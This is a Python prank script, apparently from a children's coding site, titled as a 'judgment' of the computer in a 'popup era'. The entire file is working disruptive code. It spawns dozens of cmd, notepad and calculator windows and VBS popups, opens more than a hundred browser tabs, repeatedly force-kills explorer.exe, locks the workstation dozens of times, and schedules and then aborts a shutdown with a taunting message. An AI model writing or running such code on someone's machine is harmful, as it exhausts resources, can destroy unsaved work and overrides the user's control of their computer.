name: 电脑的审判V0.2版本 弹窗时代（注意内存）
xml:
from ctypes import *
import os,time,webbrowser as w
os.system('start 整人小程序/审判词.vbs')
time.sleep(6)
for x in [0,1,2,3]:
    for i in range(7):
        os.system('start 整人小程序/是否报废.vbs')
    time.sleep(0.6)
for i in range(20):
    os.system('start cmd')
for i in range(10):
    os.system('start notepad')
for i in range(5):
    os.system('start calc')
for i in range(10):
    os.system('start cmd')
for i in range(11):
    os.system('start 整人小程序/是否报废.vbs')
w.open('https://code.xueersi.com/')
time.sleep(1)
w.open('https://www.baidu.com/')
time.sleep(1)
w.open('https://www.bilibili.com/')
time.sleep(1)
w.open('https://www.zxx.edu.cn/')
time.sleep(1)
for i in range(10):
    os.system('start cmd')
os.system('start C:')
for i in range(11):
    os.system('start 整人小程序/是否报废.vbs')
os.system('start C:/Users')
time.sleep(0.5)
for i in range(3):
    os.system('taskkill /f /im explorer.exe')
    time.sleep(1)
    os.system('explorer.exe')
    time.sleep(1)
for i in range(11):
    os.system('start 整人小程序/是否报废.vbs')
for i in range(10):
    os.system('start cmd')
    os.system('start notepad')
    os.system('start notepad')
for i in range(111):
    w.open('https://www.bilibili.com/')
w.open('https://space.bilibili.com/418073971')
for i in range(7):
    os.system('start 整人小程序/必须五连.vbs')
os.system('taskkill /f /im cmd.exe')
import os
os.system('taskkill /f /im notepad.exe')
os.system('taskkill /f /im Calculator.exe')
user32 = windll.LoadLibrary('user32.dll')
for i in range(5):
    user32.LockWorkStation()
    time.sleep(1)
for i in range(30):
    user32.LockWorkStation()
    time.sleep(0.1)
os.system('explorer')
os.system('explorer.exe')
for i in range(11):
    os.system('start 整人小程序/是否报废.vbs')
for i in range(7):
    os.system('start 整人小程序/必须五连.vbs')
for i in range(5):
    os.system('start 整人小程序/审判词.vbs')
os.system('shutdown /s /c 你的好日子到头了！我电脑是不会认输的 /t 100')
time.sleep(5)
os.system('shutdown /a')
time.sleep(0.5)
user32.LockWorkStation()
for i in range(10):
    os.system('start cmd')
print('第一部分：弹窗时代：结束了，做完了')
